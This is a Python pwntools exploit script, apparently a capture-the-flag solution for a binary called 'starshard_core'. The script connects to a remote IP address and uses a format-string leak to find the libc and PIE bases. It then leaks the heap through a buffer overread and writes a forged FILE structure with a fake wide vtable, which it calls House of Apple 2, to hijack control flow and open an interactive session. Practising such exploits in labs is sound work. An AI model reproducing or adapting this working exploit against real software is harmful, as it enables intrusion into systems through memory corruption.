from pwn import *

# setup
context.log_level = 'debug'
exe = ELF("./starshard_core")
libc = ELF("./glibc/libc.so.6")

# set context binary for correct 64-bit packing
context.binary = exe

# p = process("./starshard_core")
p = remote('154.57.164.65', 31764)

p.recvuntil(b"Name: ")

# ==========================================================
# STEP 1: leak pie and libc base
# ==========================================================
p.sendline(b"%9$p%11$p")

p.recvuntil(b"Welcome ")
raw_leak = p.recvline().strip()
parts = raw_leak.split(b"0x")

libc_leak = int(parts[1], 16)
pie_leak  = int(parts[2].split()[0], 16)

# Remote offsets
exe.address = pie_leak - 0x175e
libc.address = libc_leak - 0x2dfd0

print(f"Libc Base: {hex(libc.address)}")
print(f"PIE Base:  {hex(exe.address)}")

# ==========================================================
# STEP 2: leak the heap
# ==========================================================
p.recvuntil(b'> ')
p.sendline(b'1') # Arm

# buffer overread -> file pointer in heap
p.sendlineafter(b"Name: ", b"A"*24)
p.recvuntil(b"A"*24)
heap_leak = u64(p.recv(6).ljust(8, b"\x00"))
heap_base = heap_leak & ~0xfff
print(f"Heap Leak: {hex(heap_leak)}")

# Free the chunk so we can overwrite it
p.sendlineafter(b"> ", b"3")

# ==========================================================
# STEP 3: House of Apple 2
# ==========================================================
target_func = exe.symbols['ginger_gate']

# Vtable must be _IO_wfile_jumps, address in libc with glibc 2.24 updates
vtable = libc.symbols['_IO_wfile_jumps']

# Pointers relative to our heap chunk
safe_ptr = heap_leak + 0x40           # Zeroes for lock
fake_wide_data = heap_leak + 0xE0     # Location of fake wide data
fake_wide_vtable = heap_leak + 0x150  # Location of fake wide vtable

payload = flat({
    0x00: "  sh",
    0x28: 0,
    0x88: safe_ptr,
    0xA0: fake_wide_data,
    0xD8: vtable,
    0xE0 + 0x18: 0,  # _IO_write_base
    0xE0 + 0x20: 0,  # _IO_write_ptr
    0xE0 + 0x28: 0,  # _IO_write_end
    0xE0 + 0x30: 0,  # _IO_buf_base
    0xE0 + 0xE0: fake_wide_vtable,
    0x150 + 0x68: target_func # fake wide vtable where it will jump after overflow

}, filler=b'\x00', length=464)

# ==========================================================
# STEP 4: trigger
# ==========================================================
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"Size: ", b"470") # Sync fix (eat the newline)
p.sendlineafter(b"Fragment:", payload)

p.sendlineafter(b"> ", b"4")

p.interactive()